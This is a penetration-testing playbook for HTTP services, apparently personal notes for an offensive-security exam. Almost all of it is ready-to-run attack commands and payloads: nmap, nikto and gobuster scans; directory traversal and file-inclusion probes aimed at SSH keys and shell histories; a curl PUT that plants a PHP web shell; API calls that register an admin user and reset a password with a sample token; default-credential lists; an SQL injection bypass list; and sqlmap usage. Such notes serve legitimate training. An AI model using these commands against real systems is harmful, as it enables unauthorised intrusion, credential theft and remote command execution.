# Hyper Text Transfer Protocol (HTTP)

Ports: 80 TCP

Domain-name address:

Stack:
- OS:
- Server:
	- Apache Modules:
- Database:
- Scripting languages:

Web application:
- Name:
- Version:

--------------------------------------------------------------------------

## Enumeration Playbook

### Set vars

    read input; export TARGET_IP=$input

### Scan

- nmap discovery scan (safe)
        
      sudo nmap -p 80 --script="(discovery or auth or broadcast) and safe and http-*" --script-args newtargets $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"_nmap_80_discovery_safe

- nmap vuln scan (safe)

      sudo nmap -p 80 --script="vuln and safe and (vulners or http-*)" $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"_nmap_80_vuln_safe

- nmap discovery scan (intrusive)

      sudo nmap -p 80 --script="(discovery or auth or broadcast) and intrusive and http*" --script-args newtargets $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"_nmap_80_discovery_intrusive

- nmap vuln scan (intrusive)

      sudo nmap -p 80 --script="vuln and intrusive) and http-*" $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"_nmap_80_vuln_intrusive
  
- Joel's nmap Script Scan

      nmap -sV -Pn -vv --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-robots.txt,http-devframework,http-enum,http-frontpage-login,http-git,http-iis-webdav-vuln,http-php-version,http-robots.txt,http-shellshock,http-vuln-cve2015-1635 -p 80 $TARGET_IP

- nikto

      nikto -h http://$TARGET_IP

  Nikto with squid proxy

      nikto -h -useproxy http://$TARGET_IP:4444

### Check for common files.

- robots.txt
- .htaccess

### Enumerate directories and files.

- Directory Scan

      gobuster dir -u $TARGET_URL -w $DIRECTORY_WORDLIST -o "$WORKING_DIRECTORY""$TARGET_IP"_gobuster_dirscan

- Common Page Scan

      gobuster dir -x html,php,txt,js,json -u $TARGET_URL  -w $DIRECTORY_WORDLIST -o "$WORKING_DIRECTORY""$TARGET_IP"_gobuster_pagescan_common

- Uncommon Page Scan

      gobuster dir -x jsp,do -u $TARGET_URL  -w $DIRECTORY_WORDLIST -o "$WORKING_DIRECTORY""$TARGET_IP"_gobuster_pagescan_uncommonp

- File Scan

      gobuster dir -x bak,bmp,jpg,jpeg,gif -u $TARGET_URL  -w $DIRECTORY_WORDLIST -o "$WORKING_DIRECTORY""$TARGET_IP"_gobuster_filescan

- API Scan

      gobuster dir -u $TARGET_URL -w $API_WORDLIST -p $API_PATTERN_LIST $o "$WORKING_DIRECTORY""$TARGET_IP"_gobuster_apiscan
    
- Excluding status codes
    - Add option: `-b <code>`
    - Further Info: https://infinitelogins.com/2020/09/05/dealing-gobuster-wildcard-and-status-code-errors/
    
- Other tools:

  [[../Tools/fuff]]
  [[../Tools/dirsearch]]

### Check for LFI/RFI
https://cobalt.io/blog/a-pentesters-guide-to-file-inclusion

https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion

Look for scripts with exposed parameters:

    http://vulnerable_host/preview.php?file=example.html

Scan:

- Kadimus
    https://github.com/P0cL4bs/kadimus

      ./kadimus -u http://$TARGET_IP/example.php?page=

- Check for directory Traversal

      sudo dotdotpwn -m http -h http://$TARGET_IP -M GET -O

      sudo dotdotpwn -m http-url -u http://$TARGET_IP/index.php?book=TRAVERSAL -O -k root: -b

- `-k` specifies search string (I.E. root: entry in passwd file) 

- Bypass file extension checks

    - Null byte injection:
    
          http://$TARGET_IP/page=http://$TARGET_IP/maliciousfile.txt%00
    
    - Other:   
    
          http://$TARGET_IP/page=http://$TARGET_IP/maliciousfile.txt?

- Bypass execution

      http://$TARGET_IP/index.php?page=php://filter/convert.base64-encode/resource=index
      base64 -d savefile.php

- PHP
  https://cobalt.io/blog/a-pentesters-guide-to-file-inclusion

- If have LFI, check: 

      /home/<user>/.ssh/id_rsa
      /home/<user>/.ssh/authorized_keys
      /home/<user>/.bash_history (and other shell histories)
      /home/<user>/.profile (and other shell profiles)
      /var/log/apache2/access.log

### Inspect with developer tools
- Cookies
- Requests/Responses
- Page source
- inspector
- Debugger

### curl

- Get Header

      curl -I http://$TARGET_IP 

- Get everything

       curl -i http://$TARGET_IP

- Get everything; follow redirect

      curl -i -L  http://$TARGET_IP

- Check for title and all links

      curl -s -L http://$TARGET_IP | grep "title\|href" | sed -e 's/^[[:space:]]*//'

- Look at page with just text

      curl -s -L http://$TARGET_IP | html2text -width '99' | uniq

- Check if it is possible to upload using put
    
      curl -v -X OPTIONS http:///$TARGET_IP
      curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$TARGET_IP/test/shell.php

### Nmap brute force

    sudo nmap -p 80 --script="brute and http*" $TARGET_IP -oN "$WORKING_DIRECTORY""$TARGET_IP"_nmap_80_brute
		
--------------------------------------------------------------------------
## APIs

### Enumerate
1. Examine url with curl

        curl -i http://$TARGET_IP/users/v1

2. Expand inpsection by inserting found properties like usernames into the path and running additional scans:

        gobuster dir -u http://$TARGET_IP/users/v1/admin -w $DIRECTORY_LIST

3. Probe additional findings with curl

        curl -i http://$TARGET_IP/users/v1/admin/password

    A 405 response indicates the URL is valid but requires a different HTTP request type (POST, PUT) (Default is GET)

### Check for login
1. If access to user credentials as above then check for login function

        curl -i http://$TARGET_IP/users/v1/login

2. Look for a status message in the response that indicates the function is active.
3. Craft a request with valid user to further test login.

        curl -d '{"password":"admin","username":"admin"}' -H 'Content-Type: application/json'  http://TARGET_IP/users/v1/login

4. Look for status message in response indicating further requirements.

### Check for user registration
1. Check for register function.

        curl -d '{"password":"password","username":"test123"}' -H 'Content-Type: application/json'  http://$TARGET_IP/users/v1/register

2. Look for a status message in response that indicates the function is active/requires additional parameters.
3. Craft a request with necessary parameters.

        curl -d '{"password":"password","username":"test123","email":"pwn@test.com"}' -H 'Content-Type: application/json' http://$TARGET_IP/users/v1/register

5. If user successfully created check for abilty to use administrative key to enable admin permissions.

        curl -d '{"password":"","username":"offsec","admin":"True"}' -H 'Content-Type: application/json' http://$TARGET_IP/users/v1/register

### Change user pw

- Using auth token recieved from curl login to craft a message to send to password function

        curl -X 'PUT' 'http://$TARGET_IP/users/v1/admin/password' -H 'Content-Type: application/json' -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' -d '{"password": "pwned"}'
	

--------------------------------------------------------------------------

## Web Portals

### Test Default passwords
- Google documentation for default passwords and test them:

      site:webapplication.com password

### Construct wordlist

- Crawl/build wordlist from entire site with cewl

- Include Default/weak logins:
    admin admin
    admin password
    admin <empty_string>
    admin nameofservice
    root root
    root admin
    root password
    root nameofservice
    <username_> password
    <username_> admin
    <username_> username
    <username_> nameofservice

### Brute force with Burp Suite Intruder
https://portswigger.net/burp/documentation/desktop/tools/intruder
-   Check both http response codes and response lengths for unusual responses to identify   successful logins
-   Recommended wordlist: 

--------------------------------------------------------------------------

## Bypassing File Upload Restrictions
https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/

--------------------------------------------------------------------------

## View PHP source

- php://filter/convert.base64-encode/resource=<php_file_path>
  Ex:
	
      http://192.168.152.58/image.php?img=php://filter/convert.base64-encode/resource=/var/www/html/image.php

--------------------------------------------------------------------------

## WebDAV

- davtest	

    Tests WebDAV enabled servers by uploading test executable files.

      davtest -url http://$TARGET_IP 

    - (Optional) Uploads files which allow for command execution or other actions directly on the target.

- cadaver

    A command-line WebDAV client for Unix.
	
--------------------------------------------------------------------------
	
## Google Authenicator

Generate 2fa token with https://totp.danhersam.com/ using secret key ND4LKCSFMUQISO6CBZQATLDP

Reference: https://github.com/itemir/apache_2fa

--------------------------------------------------------------------------

## SQL-Injection

https://xapax.gitbooks.io/security/content/sql-injections.html

This is the most classic, standard first test:

    ' or '1'='1
    " or "1"="1

Then you have:

    -'
    ' '
    '&'
    '^'
    '*'
    ' or ''-'
    ' or '' '
    ' or ''&'
    ' or ''^'
    ' or ''*'
    "-"
    " "
    "&"
    "^"
    "*"
    " or ""-"
    " or "" "
    " or ""&"
    " or ""^"
    " or ""*"
    or true#
    ' or true#
    " or true#
    ') or true#
    ") or true#
    or true-- 
    ' or true-- 
    " or true-- 
    ') or true-- 
    ") or true-- 
    ' or 'x'='x
    ') or ('x')=('x
    ')) or (('x'))=(('x
    " or "x"="x
    ") or ("x")=("x
    ")) or (("x"))=(("x

### Sql-login-bypass

- Open Burp-suite
- Make and intercept request
- Send to intercepted request to intruder
- Cluster attack (?)
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation

NOT FOR EXAM    NOT FOR EXAM    NOT FOR EXAM

- Post

	./sqlmap.py -r search-test.txt -p tfUPass

- Get
	
	sqlmap -u "http://$TARGET_IP/index.php?id=1" --dbms=mysql

- Crawl

	sqlmap -u http://$TARGET_IP --dbms=mysql --crawl=3

NOT FOR EXAM    NOT FOR EXAM    NOT FOR EXAM